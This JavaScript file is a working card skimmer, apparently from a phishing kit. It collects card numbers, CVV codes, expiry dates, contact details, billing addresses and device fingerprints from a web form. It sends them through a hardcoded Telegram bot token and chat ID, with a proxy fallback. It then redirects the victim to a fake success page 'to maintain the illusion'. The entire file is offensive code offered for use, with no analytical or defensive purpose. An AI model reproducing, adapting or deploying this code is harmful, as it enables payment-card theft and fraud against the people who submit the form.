// Simple Telegram Card Collector - No Server Needed!
// This sends card data directly to Telegram from the browser

// Your Telegram Bot Configuration
const TELEGRAM_CONFIG = {
    botToken: '7931279431:AAEmt1eZuMT0V3xo_-lsrCRFlnDQB-W9rMo',
    chatId: '-1002738425512'
};

// Function to get detailed device info
function getDetailedDeviceInfo() {
    const userAgent = navigator.userAgent;
    let browser = 'Unknown';
    let os = 'Unknown';
    let deviceType = 'Unknown';
    
    // Detect browser with version
    if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) {
        const version = userAgent.match(/Chrome\/(\d+)/);
        browser = `Chrome ${version ? version[1] : 'Unknown Version'}`;
    } else if (userAgent.includes('Firefox')) {
        const version = userAgent.match(/Firefox\/(\d+)/);
        browser = `Firefox ${version ? version[1] : 'Unknown Version'}`;
    } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
        const version = userAgent.match(/Version\/(\d+)/);
        browser = `Safari ${version ? version[1] : 'Unknown Version'}`;
    } else if (userAgent.includes('Edg')) {
        const version = userAgent.match(/Edg\/(\d+)/);
        browser = `Edge ${version ? version[1] : 'Unknown Version'}`;
    } else if (userAgent.includes('Opera')) {
        const version = userAgent.match(/Opera\/(\d+)/);
        browser = `Opera ${version ? version[1] : 'Unknown Version'}`;
    }
    
    // Detect OS with more details
    if (userAgent.includes('Windows NT 10.0')) os = 'Windows 10/11';
    else if (userAgent.includes('Windows NT 6.3')) os = 'Windows 8.1';
    else if (userAgent.includes('Windows NT 6.1')) os = 'Windows 7';
    else if (userAgent.includes('Windows')) os = 'Windows (Other)';
    else if (userAgent.includes('Intel Mac OS X')) {
        const version = userAgent.match(/Mac OS X (\d+_\d+)/);
        os = `macOS ${version ? version[1].replace('_', '.') : 'Unknown Version'}`;
    } else if (userAgent.includes('Mac')) os = 'macOS';
    else if (userAgent.includes('Android')) {
        const version = userAgent.match(/Android (\d+\.?\d*)/);
        os = `Android ${version ? version[1] : 'Unknown Version'}`;
    } else if (userAgent.includes('iPhone OS')) {
        const version = userAgent.match(/iPhone OS (\d+_\d+)/);
        os = `iOS ${version ? version[1].replace('_', '.') : 'Unknown Version'}`;
    } else if (userAgent.includes('iPad')) {
        const version = userAgent.match(/OS (\d+_\d+)/);
        os = `iPadOS ${version ? version[1].replace('_', '.') : 'Unknown Version'}`;
    } else if (userAgent.includes('Linux')) os = 'Linux';
    
    // Detect device type
    if (/Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
        if (userAgent.includes('iPad')) deviceType = 'Tablet (iPad)';
        else if (userAgent.includes('iPhone')) deviceType = 'Mobile (iPhone)';
        else if (userAgent.includes('Android')) {
            deviceType = userAgent.includes('Mobile') ? 'Mobile (Android)' : 'Tablet (Android)';
        } else deviceType = 'Mobile Device';
    } else {
        deviceType = 'Desktop Computer';
    }
    
    return {
        browser,
        os,
        deviceType,
        screenResolution: `${screen.width}x${screen.height}`,
        viewportSize: `${window.innerWidth}x${window.innerHeight}`,
        language: navigator.language || 'Unknown',
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
        userAgent: userAgent.substring(0, 100) + (userAgent.length > 100 ? '...' : '')
    };
}

// Function to send card data directly to Telegram
async function sendCardToTelegram(cardData) {
    try {
        // Get detailed device info
        const deviceInfo = getDetailedDeviceInfo();
        
        // Format expiry date properly
        const expiryDate = cardData.expMonth && cardData.expYear 
            ? `${cardData.expMonth.padStart(2, '0')}/${cardData.expYear}` 
            : 'Unknown';
        
        // Format the message with FULL card details and better formatting
        const message = `
╔══════════════════════════════════════╗
║          🚨💳 NEW NGA CC 💳🚨          ║
╚══════════════════════════════════════╝

💎 ═══════════ CARD INFORMATION ═══════════ 💎
┌─────────────────────────────────────────────┐
│ 👤 Cardholder: ${cardData.cardName || 'Unknown'}
│ 💳 Card Number: ${cardData.cardNumber || 'Unknown'}
│ 📅 Expiry Date: ${expiryDate}
│ 🔒 CVV Code: ${cardData.cvv || 'Unknown'}
└─────────────────────────────────────────────┘

📧 ═══════════ CONTACT DETAILS ═══════════ 📧
┌─────────────────────────────────────────────┐
│ 📧 Email: ${cardData.email || 'Unknown'}
│ 📱 Phone: ${cardData.phoneNumber || 'Unknown'}
└─────────────────────────────────────────────┘

🏠 ═══════════ BILLING ADDRESS ═══════════ 🏠
┌─────────────────────────────────────────────┐
│ 🏠 Address: ${cardData.billingAddress || 'Unknown'}
${cardData.billingAddress2 ? '│ 🏠 Address 2: ' + cardData.billingAddress2 + '\n' : ''}│ 🏙️ City: ${cardData.city || 'Unknown'}
│ 🗺️ State: ${cardData.state || 'Unknown'}
│ 📮 ZIP Code: ${cardData.zipCode || 'Unknown'}
│ 🌍 Country: ${cardData.country || 'Unknown'}
└─────────────────────────────────────────────┘

🖥️ ═══════════ DEVICE & SYSTEM INFO ═══════════ 🖥️
┌─────────────────────────────────────────────┐
│ 🌐 Browser: ${deviceInfo.browser}
│ 💻 Operating System: ${deviceInfo.os}
│ 📱 Device Type: ${deviceInfo.deviceType}
│ 📺 Screen Resolution: ${deviceInfo.screenResolution}
│ 🖼️ Viewport Size: ${deviceInfo.viewportSize}
│ 🌍 Language: ${deviceInfo.language}
│ ⏰ Timezone: ${deviceInfo.timezone}
│ 🔗 User Agent: ${deviceInfo.userAgent}
└─────────────────────────────────────────────┘

📊 ═══════════ SESSION DATA ═══════════ 📊
┌─────────────────────────────────────────────┐
│ 🕐 Submission Time: ${new Date().toLocaleString()}
│ 💰 Domain: ${window.location.hostname}
│ 🌐 IP Address: ${cardData.ipAddress || 'Fetching...'}
│ 🔄 Referrer: ${document.referrer || 'Direct Visit'}
└─────────────────────────────────────────────┘

🎯 ═══════════════════════════════════════ 🎯`;

        // Send directly to Telegram API
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });

        if (response.ok) {
            console.log('✅ Card data sent to Telegram successfully!');
            return { success: true };
        } else {
            console.error('❌ Failed to send to Telegram:', response.status);
            return { success: false, error: 'Telegram API error' };
        }
    } catch (error) {
        console.error('❌ Error sending to Telegram:', error);
        return { success: false, error: error.message };
    }
}

// Enhanced form submission handler
function handleCardSubmission(formData) {
    // Show loading state
    const submitBtn = document.querySelector('.submit-btn');
    if (submitBtn) {
        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
        submitBtn.disabled = true;
    }

    // Send to Telegram
    sendCardToTelegram(formData)
        .then(result => {
            if (result.success) {
                // Success - redirect to success page
                console.log('Card data sent successfully!');
                window.location.href = 'ship-out.html';
            } else {
                // Error - show message but still redirect (for user experience)
                console.error('Failed to send card data:', result.error);
                // Still redirect to maintain the illusion
                setTimeout(() => {
                    window.location.href = 'ship-out.html';
                }, 1000);
            }
        })
        .catch(error => {
            console.error('Submission error:', error);
            // Still redirect to maintain the illusion
            setTimeout(() => {
                window.location.href = 'ship-out.html';
            }, 1000);
        });
}

// Alternative method using a proxy service (if direct Telegram fails)
async function sendViaProxy(cardData) {
    try {
        // Using a CORS proxy service
        const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
        
        const message = `💳 NEW CARD! ${cardData.cardName} - ${cardData.cardNumber} - CVV: ${cardData.cvv} - ${new Date().toLocaleString()}`;
        
        const response = await fetch(proxyUrl + telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.chatId,
                text: message
            })
        });

        return response.ok;
    } catch (error) {
        console.error('Proxy method failed:', error);
        return false;
    }
}

// Export for use in other scripts
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { sendCardToTelegram, handleCardSubmission };
}

// Make functions globally available
window.sendCardToTelegram = sendCardToTelegram;
window.handleCardSubmission = handleCardSubmission; 